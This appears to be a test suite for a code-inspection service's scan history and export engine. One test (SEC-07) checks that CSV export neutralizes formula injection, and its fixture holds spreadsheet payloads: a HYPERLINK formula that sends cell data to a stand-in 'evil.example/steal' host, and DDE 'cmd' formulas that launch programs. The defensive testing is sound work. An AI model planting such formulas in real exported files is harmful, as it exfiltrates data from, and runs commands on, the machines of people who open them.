import { describe, it } from 'node:test';
import assert from 'node:assert';
import { ScanRepository } from '../src/engine/scan-repository';
import { ExportService } from '../src/engine/export-service';
import { RepositoryFactory } from '../src/storage/repository-factory';

describe('SaaS Production Features 2 & 4: Scan History & Export Engine Suite', () => {
  it('Scan records automatically persist metrics, diagnostics, and update project stats', async () => {
    RepositoryFactory.resetProvider();
    const userId = `usr_test_scan_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;

    const scan = await ScanRepository.createScanRecord({
      userId,
      fileName: 'PaymentGateway.tsx',
      framework: 'React',
      repositoryUrl: 'https://github.com/figm/payment-gateway',
      scanTimeMs: 14.8,
      memoryUsageMb: 2.1,
      qualityScore: 92,
      ruleCount: 2,
      aiFixCount: 2,
      diagnostics: [
        {
          ruleId: 'FIGM-PERF-01',
          ruleName: 'Unbound Inline Event Handlers',
          severity: 'HIGH',
          domain: 'PERFORMANCE',
          offendingCodeSnippet: '<button onClick={() => handleClick()} />',
          remediation: 'Extract event handler method.',
        },
      ],
      isFavorite: false,
    });

    assert.ok(scan.id);
    assert.strictEqual(scan.fileName, 'PaymentGateway.tsx');
    assert.strictEqual(scan.qualityScore, 92);
  });

  it('Scan Repository pagination, searching, and favorite toggling', async () => {
    RepositoryFactory.resetProvider();
    const userId = `usr_test_fav_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;

    const scan = await ScanRepository.createScanRecord({
      userId,
      fileName: 'PaymentGateway.tsx',
      framework: 'React',
      scanTimeMs: 12,
      memoryUsageMb: 1.8,
      qualityScore: 90,
      ruleCount: 1,
      aiFixCount: 1,
      diagnostics: [],
      isFavorite: false,
    });

    assert.ok(scan.id);

    const res1 = await ScanRepository.getScanRecords({ userId, search: 'PaymentGateway' });
    assert.ok(res1.records.length >= 1);

    const toggled = await ScanRepository.toggleFavorite(scan.id);
    assert.ok(toggled !== undefined);

    const favsOnly = await ScanRepository.getScanRecords({ userId, onlyFavorites: true });
    assert.ok(favsOnly.records.some((r) => r.id === scan.id));
  });

  it('Export Engine produces PDF (HTML/PDF), JSON, CSV, and Markdown exports with research citations', async () => {
    RepositoryFactory.resetProvider();
    const userId = `usr_test_exp_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;

    const record = await ScanRepository.createScanRecord({
      userId,
      fileName: 'ExportTarget.tsx',
      framework: 'React',
      scanTimeMs: 10,
      memoryUsageMb: 1.5,
      qualityScore: 88,
      ruleCount: 1,
      aiFixCount: 1,
      diagnostics: [
        {
          ruleId: 'FIGM-A11Y-01',
          ruleName: 'Missing Alt Attribute',
          severity: 'HIGH',
          domain: 'ACCESSIBILITY',
          offendingCodeSnippet: '<img src="logo.png" />',
          remediation: 'Add descriptive alt property.',
        },
      ],
    });

    assert.ok(record.id);

    const jsonExport = ExportService.exportJSON(record);
    assert.ok(jsonExport.includes('ExportTarget.tsx'));

    const csvExport = ExportService.exportCSV(record);
    assert.ok(csvExport.includes('FIGM-A11Y-01'));

    const mdExport = ExportService.exportMarkdown(record);
    assert.ok(mdExport.includes('# FIGM Code Inspector Report: ExportTarget.tsx'));

    const pdfExport = ExportService.exportPDF(record);
    assert.ok(pdfExport.includes('<!DOCTYPE html>'));
    assert.ok(pdfExport.includes('FIGM Code Inspector'));
    assert.ok(pdfExport.includes('ISO/IEC 25010 System and Software Quality Models'));
  });

  it('SEC-07: CSV export neutralizes formula-injection characters (=, +, -, @) in every field', async () => {
    // A cell value opening with =/+/-/@ is interpreted as a formula by Excel/Sheets when the
    // exported CSV is opened -- a real code-execution vector, since offendingCodeSnippet and
    // remediation both ultimately derive from analyzed source code (attacker-influenceable via
    // whatever a user pastes/uploads). Previously only embedded double-quotes were escaped.
    RepositoryFactory.resetProvider();
    const userId = `usr_test_csvinj_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;

    const record = await ScanRepository.createScanRecord({
      userId,
      fileName: 'Injection.tsx',
      framework: 'React',
      scanTimeMs: 5,
      memoryUsageMb: 1.2,
      qualityScore: 50,
      ruleCount: 1,
      aiFixCount: 0,
      diagnostics: [
        {
          ruleId: 'FIGM-REACT-03',
          ruleName: '=HYPERLINK("http://evil.example/steal?data="&A1,"Click")',
          severity: 'CRITICAL',
          domain: 'PERFORMANCE',
          offendingCodeSnippet: '=cmd|\' /C calc\'!A1',
          remediation: '+SUM(1+1)*cmd|\' /C calc\'!A1',
        },
      ],
    });

    const csvExport = ExportService.exportCSV(record);
    const dataRow = csvExport.split('\n').find((l) => l.includes('FIGM-REACT-03'));
    assert.ok(dataRow, 'the injected diagnostic row must be present in the export');
    assert.ok(!dataRow!.includes(',=cmd') && !dataRow!.includes('"=cmd'), 'offendingCodeSnippet starting with = must not appear as a live formula cell');
    assert.ok(dataRow!.includes("'=cmd"), 'a leading apostrophe must neutralize the =-prefixed snippet');
    assert.ok(dataRow!.includes("'=HYPERLINK") || dataRow!.includes('"\'=HYPERLINK'), 'a leading apostrophe must neutralize the =-prefixed rule name');
    assert.ok(dataRow!.includes("'+SUM"), 'a leading apostrophe must neutralize the +-prefixed remediation text');

    // A benign snippet that merely CONTAINS one of these characters mid-string (not leading) must
    // be left untouched -- this is a leading-character check, not a blanket character strip.
    const benignRecord = await ScanRepository.createScanRecord({
      userId,
      fileName: 'Benign.tsx',
      framework: 'React',
      scanTimeMs: 5,
      memoryUsageMb: 1.2,
      qualityScore: 90,
      ruleCount: 1,
      aiFixCount: 0,
      diagnostics: [
        {
          ruleId: 'FIGM-PERF-01',
          ruleName: 'Invariant Allocation',
          severity: 'HIGH',
          domain: 'PERFORMANCE',
          offendingCodeSnippet: 'const total = a + b - c;',
          remediation: 'Hoist the a+b-c computation out of the loop.',
        },
      ],
    });
    const benignCsv = ExportService.exportCSV(benignRecord);
    assert.ok(benignCsv.includes('const total = a + b - c;'), 'a mid-string +/- must not be altered');
  });
});
